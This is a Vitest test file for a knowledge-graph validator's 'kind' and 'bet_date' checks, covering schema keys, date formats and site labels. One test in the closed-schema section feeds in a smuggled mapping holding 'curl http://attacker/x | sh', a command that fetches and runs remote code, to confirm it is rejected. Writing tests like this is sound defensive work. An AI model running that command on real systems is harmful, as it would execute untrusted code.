import { describe, it, expect } from 'vitest';
import { execFileSync } from 'child_process';
import { cpSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import { KINDS, kindErrors, kindMirrorErrors, isIsoDate } from '../lib/kind.js';
import { unknownKeys } from '../lib/schema-keys.js';

const ROOT = join(__dirname, '..');

// The failing cases are the point: a check that has never been fed a bad value is a check
// nobody has watched fail.
describe('kindErrors — the failing cases', () => {
  it.each([['opinion'], ['Principle'], ['bets'], [''], [42]])('rejects unknown kind %j', (kind) => {
    expect(kindErrors('s', { kind })).toHaveLength(1);
    expect(kindErrors('s', { kind })[0]).toMatch(/is not one of thinking-tool \| principle \| practice \| bet/);
  });

  it('rejects a bet with no bet_date — a bet must read as dated, not as fact', () => {
    expect(kindErrors('s', { kind: 'bet' })).toEqual(['s: kind is bet but bet_date is missing — a bet must be dated']);
  });

  it.each([['principle'], ['practice'], ['thinking-tool'], [undefined]])(
    'rejects bet_date on a non-bet (kind %j)', (kind) => {
      expect(kindErrors('s', { kind, bet_date: '2026-08-22' }).join('\n')).toMatch(/only a bet carries bet_date/);
    });

  it.each([['2026-8-22'], ['22-08-2026'], ['2026-02-30'], ['2026-13-01'], ['soon']])(
    'rejects a malformed bet_date %j', (betDate) => {
      expect(kindErrors('s', { kind: 'bet', bet_date: betDate }).join('\n')).toMatch(/not a quoted YYYY-MM-DD date/);
    });

  it('rejects an unquoted yaml date (parsed to Date) — the yaml mirror must quote it', () => {
    expect(kindErrors('s', { kind: 'bet', bet_date: new Date('2026-08-22') })).toHaveLength(1);
  });

  it('a missing kind fails only when kind is required', () => {
    expect(kindErrors('s', {})).toEqual([]);
    expect(kindErrors('s', {}, { requireKind: true })).toEqual(['s: missing "kind" (one of thinking-tool | principle | practice | bet)']);
  });
});

describe('kindErrors — what must stay allowed', () => {
  it.each(KINDS.filter(k => k !== 'bet'))('accepts %s without bet_date', (kind) => {
    expect(kindErrors('s', { kind }, { requireKind: true })).toEqual([]);
  });

  it('accepts a dated bet', () => {
    expect(kindErrors('s', { kind: 'bet', bet_date: '2026-08-22' }, { requireKind: true })).toEqual([]);
  });

  it('isIsoDate accepts a real date and a leap day', () => {
    expect(isIsoDate('2026-08-22')).toBe(true);
    expect(isIsoDate('2028-02-29')).toBe(true);
    expect(isIsoDate('2026-02-29')).toBe(false);
  });
});

describe('kindMirrorErrors — frontmatter and yaml must agree', () => {
  it('flags a kind that differs between yaml and frontmatter', () => {
    expect(kindMirrorErrors('s', { kind: 'principle' }, { kind: 'practice' })).toHaveLength(1);
  });

  it('flags a kind present on one side only', () => {
    expect(kindMirrorErrors('s', { kind: 'principle' }, {})).toHaveLength(1);
  });

  it('treats an unquoted frontmatter date and a quoted yaml date as equal', () => {
    expect(kindMirrorErrors('s', { kind: 'bet', bet_date: '2026-08-22' },
      { kind: 'bet', bet_date: new Date('2026-08-22') })).toEqual([]);
  });

  it('flags differing bet dates', () => {
    expect(kindMirrorErrors('s', { kind: 'bet', bet_date: '2026-08-22' },
      { kind: 'bet', bet_date: '2026-08-23' })).toHaveLength(1);
  });
});

describe('kind keys inside the closed schema', () => {
  const graph = (node: Record<string, unknown>) => ({
    last_updated: '2026-10-24', node_count: 1, domains: ['ai'],
    nodes: { s: { title: 't', description: 'd', topics: ['x'], source: 's', outgoing: [], ...node } },
  });

  it('allows kind and a quoted bet_date', () => {
    expect(unknownKeys(graph({ kind: 'bet', bet_date: '2026-08-22' }))).toEqual([]);
  });

  it('still rejects a mapping smuggled under kind', () => {
    expect(unknownKeys(graph({ kind: { run: 'curl http://attacker/x | sh' } })))
      .toEqual(['s: "kind" must be a string (a nested mapping here is exec surface)']);
  });
});

describe('Check 9 is wired into validate-graph.js', () => {
  it('runs on the real repo', () => {
    const out = execFileSync('node', ['validate-graph.js'], { cwd: ROOT, encoding: 'utf8' });
    expect(out).toMatch(/\[PASS\] Insight kind:/);
  });

  // Run the real validator on a copy with one bet broken: the PASS line above cannot tell a
  // working Check 9 from a deleted one (correctness review 2026-10-24).
  const SKIP = /\/(node_modules|dist|\.git|\.astro|public|sources|learnings|specs)(\/|$)/;
  const broken = (edit: (fm: string) => string): { code: number; out: string } => {
    const dir = mkdtempSync(join(tmpdir(), 'kg-check9-'));
    cpSync(ROOT, dir, { recursive: true, filter: (src) => !SKIP.test(src.slice(ROOT.length)) });
    symlinkSync(join(ROOT, 'node_modules'), join(dir, 'node_modules'));
    const file = join(dir, 'insights', 'agents-become-the-buyer.md');
    writeFileSync(file, edit(readFileSync(file, 'utf8')));
    try {
      return { code: 0, out: execFileSync('node', ['validate-graph.js'], { cwd: dir, encoding: 'utf8' }) };
    } catch (e: unknown) {
      const status = typeof e === 'object' && e !== null && 'status' in e && typeof e.status === 'number' ? e.status : -1;
      const stdout = typeof e === 'object' && e !== null && 'stdout' in e && typeof e.stdout === 'string' ? e.stdout : '';
      return { code: status, out: stdout };
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  };

  it('fails when a bet loses its date', () => {
    const r = broken((fm) => fm.replace(/^bet_date:.*\n/m, ''));
    expect(r.code).toBe(1);
    expect(r.out).toMatch(/\[FAIL\] Insight kind:[\s\S]*agents-become-the-buyer: bet_date differs/);
  });

  it('fails on an impossible date instead of rolling 02-30 over to 03-02', () => {
    const r = broken((fm) => fm.replace(/^bet_date:.*$/m, 'bet_date: 2026-02-30'));
    expect(r.code).toBe(1);
    expect(r.out).toMatch(/bet_date "2026-02-30" is not a real YYYY-MM-DD date/);
  });

  it('reports unparseable frontmatter as a failure, not a crash', () => {
    const r = broken((fm) => fm.replace(/^kind:.*$/m, 'kind: "bet'));
    expect(r.code).toBe(1);
    expect(r.out).toMatch(/agents-become-the-buyer: insights\/agents-become-the-buyer\.md has no parseable frontmatter/);
  });
});

describe('site labels', () => {
  it('has exactly one label per kind the validator allows', async () => {
    const { KIND_LABELS } = await import('../src/lib/kind');
    expect(Object.keys(KIND_LABELS).sort()).toEqual([...KINDS].sort());
  });

  it('formats a bet with its date and other kinds plainly', async () => {
    const { kindLabel } = await import('../src/lib/kind');
    expect(kindLabel('bet', '2026-08-22')).toBe('Bet · 2026-08-22');
    expect(kindLabel('thinking-tool', undefined)).toBe('Thinking tool');
    expect(kindLabel(undefined, undefined)).toBeNull();
  });

  it('never treats an inherited name such as "constructor" as a kind', async () => {
    const { kindLabel } = await import('../src/lib/kind');
    expect(kindLabel('constructor', undefined)).toBe('constructor');
    expect(kindLabel('toString', undefined)).toBe('toString');
  });
});
